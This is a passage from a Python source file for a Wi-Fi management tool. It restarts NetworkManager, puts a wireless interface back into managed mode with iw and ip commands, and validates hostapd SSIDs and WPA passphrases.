                stderr=subprocess.PIPE,
                timeout=5,
            ).stdout.decode().strip()
            if status != "active" and service_name == "NetworkManager":
                subprocess.run(["systemctl", "start", service_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                time.sleep(2)
                status = subprocess.run(
                    ["systemctl", "is-active", service_name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=5,
                ).stdout.decode().strip()
            if status != "active":
                app.console.print(f"[error]Failed to restart {warn}[/]")
        except subprocess.TimeoutExpired:
            app.console.print(f"[error]{warn} restart timed out[/]")
        except Exception as exc:
            app.console.print(f"[error]Error restarting {warn}: {str(exc)}[/]")
    except subprocess.TimeoutExpired:
        app.console.print(f"[error]{warn} status check timed out[/]")
    except Exception as exc:
        app.console.print(f"[error]Error checking {warn}: {str(exc)}[/]")


def _ensure_managed_mode(app) -> None:
    try:
        mode = app.wifi_adapter.get_interface_type(app.interface_name)

        def _legacy_iwconfig_managed() -> Optional[bool]:
            try:
                r = subprocess.run(
                    ["iwconfig", app.interface_name],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if r.returncode != 0:
                    return None
                return "Mode:Managed" in r.stdout
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                return None

        if mode is None:
            legacy = _legacy_iwconfig_managed()
            if legacy is True:
                mode = "managed"
            elif legacy is False:
                mode = "other"

        if mode == "managed":
            return
        if mode is None:
            app.console.print(
                "[warning]Could not read interface mode via `iw` or `iwconfig`; "
                "skipped mode check (wireless-tools may be missing or driver has no WE).[/]"
            )
            return

        app.console.print("[warning]Interface not in managed mode, attempting to fix...[/]")
        try:
            subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["iw", app.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(2)
            mode2 = app.wifi_adapter.get_interface_type(app.interface_name)
            if mode2 != "managed" and _legacy_iwconfig_managed() is not True:
                app.console.print("[error]Failed to set interface to managed mode[/]")
        except subprocess.TimeoutExpired:
            app.console.print("[error]Interface mode change timed out[/]")
        except Exception as exc:
            app.console.print(f"[error]Error changing interface mode: {str(exc)}[/]")
    except Exception as exc:
        app.console.print(f"[warning]Interface mode verification issue: {str(exc)}[/]")


def _valid_hostapd_ssid(ssid: str) -> bool:
    if not ssid or "\n" in ssid or "\r" in ssid:
        return False
    return 1 <= len(ssid.encode("utf-8", errors="ignore")) <= 32


def _valid_wpa_passphrase(passphrase: str) -> bool:
    if not passphrase or "\n" in passphrase or "\r" in passphrase:
        return False
    return 8 <= len(passphrase) <= 63
